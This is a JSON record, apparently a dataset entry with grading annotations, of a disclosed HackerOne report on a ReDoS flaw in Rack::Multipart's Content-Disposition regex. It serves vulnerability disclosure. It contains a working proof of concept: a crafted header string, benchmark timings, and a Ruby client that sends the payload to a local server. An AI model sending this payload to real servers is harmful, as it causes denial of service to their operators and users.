{
  "reported_to": "Ruby on Rails",
  "reported_by": "ooooooo_q ",
  "title": "ReDoS in Rack::Multipart",
  "content": "\nHello, I found ReDoS on Rack.\nI found this problem using recheck (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.\nThis tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on Rack::Multipart::RFC2183, which is the most dangerous.\nThis is detected as exponential by recheck.\nhttps://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38\nhttps://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296\nCode 692 Bytes\n1\u276f bundle exec irb\n2irb(main):001:0> require 'rack'\n3=> true\n4irb(main):002:0> Rack::Multipart::RFC2183\n5=> /^(?i-mx:Content-Disposition:\\s*(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+)\\s*)((?-mix:;\\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?-mix:\\*[0-9]+)?))=((?-mix:\"(?:\\\\\"|[^\"])*\"|(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?:\\*0)?\\*))=((?-mix:[a-zA-Z0-9\\-]*'[a-zA-Z0-9\\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)\\*[1-9][0-9]*\\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*))))\\s*))+$/i\nbenchmark\nrfc2183_benchmark.rb\nCode 426 Bytes\n1require 'benchmark'\n2require 'rack'\n3\n4regexp = Rack::Multipart::RFC2183\n5\n6def attack_text(length)\n7 \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * length + '='\n8end\n9\n10Benchmark.bm do |x|\n11  x.report { attack_text(5)[regexp] }\n12  x.report { attack_text(10)[regexp] }\n13  x.report { attack_text(15)[regexp] }\n14  x.report { attack_text(20)[regexp] }\n15  x.report { attack_text(25)[regexp] }\n16  x.report { attack_text(26)[regexp] }\n17end\nCode 367 Bytes\n1\u276f bundle exec ruby rfc2183_benchmark.rb\n2       user     system      total        real\n3   0.000018   0.000004   0.000022 (  0.000016)\n4   0.000357   0.000000   0.000357 (  0.000361)\n5   0.010888   0.000018   0.010906 (  0.010961)\n6   0.342814   0.000717   0.343531 (  0.344750)\n7  10.925193   0.022059  10.947252 ( 10.979092)\n8  21.906178   0.049380  21.955558 ( 22.024203)\nPoC\nGemfile\nCode 127 Bytes\n1# frozen_string_literal: true\n2\n3source \"https://rubygems.org\"\n4\n5gem 'rack', '~> 2.2', '>= 2.2.3'\n6gem 'puma', '~> 5.6', '>= 5.6.2'\nconfig.ru\nCode 108 Bytes\n1class Server\n2  def call(env)\n3    Rack::Request.new(env).params\n4\n5    [ 200, {}, []]\n6  end\n7end\n8\n9run Server.new\nCode 744 Bytes\n1require \"net/http\"\n2require \"uri\"\n3\n4class Net::HTTPGenericRequest\n5\n6  def encode_multipart_form_data(out, params, opt)\n7    charset = opt[:charset]\n8    boundary = opt[:boundary]\n9    buf = ''\n10    params.each do |key, value|\n11      buf << \"--#{boundary}\\r\\n\"\n12      buf << \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * 27 + '='\n13      buf << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n14\n15      buf << \"content\"\n16      buf << \"\\r\\n\"\n17    end\n18    buf << \"--#{boundary}--\\r\\n\"\n19    flush_buffer(out, buf, false)\n20  end\n21end  \n22\n23data = [[\"dummy\"]]\n24\n25url = URI.parse('http://127.0.0.1:9292/')\n26req = Net::HTTP::Post.new(url.path)\n27req.set_form(data, \"multipart/form-data\")\n28\n29res = Net::HTTP.new(url.host, url.port).start do |http|\n30  http.request(req)\n31end\nbundle exec rackup & bundle exec ruby rfc2183_request.rb\nImpact\nWhen the client sends a specially crafted header, it occur ReDoS on the server side.\nI confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.\nThere are several other places where Rack::Multipart is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.\nwork around\nCode 59 Bytes\n1class Rack::Request\n2  def parse_multipart\n3    nil\n4  end\n5end\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "None"
  ],
  "screenshots": {},
  "disclosed_date": 1690518360,
  "report_url": "https://hackerone.com/reports/1489141",
  "is_multi_component": false,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Identify the vulnerable regex pattern in Rack::Multipart::RFC2183"
    ],
    [
      2,
      "Craft a malicious HTTP request with a specially crafted Content-Disposition header that triggers exponential backtracking in the regex"
    ],
    [
      3,
      "Send the crafted request to a Rack server (e.g., Puma or Unicorn) to observe the ReDoS effect"
    ],
    [
      4,
      "Monitor server response times to confirm the exponential time complexity when processing the malicious input"
    ]
  ],
  "vuln_description": "The vulnerability is a Regular Expression Denial of Service (ReDoS) in Rack's multipart form data parsing component. The regex pattern used to parse Content-Disposition headers in Rack::Multipart::RFC2183 exhibits exponential time complexity when processing specially crafted input, allowing an attacker to cause severe CPU consumption on the server.",
  "reason": "While the vulnerability involves understanding regex behavior and HTTP request crafting, the attack is relatively straightforward once the vulnerable regex pattern is identified. The main complexity comes from recognizing the exponential backtracking potential in the regex, but the actual exploitation doesn't require complex application state manipulation or novel logic.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}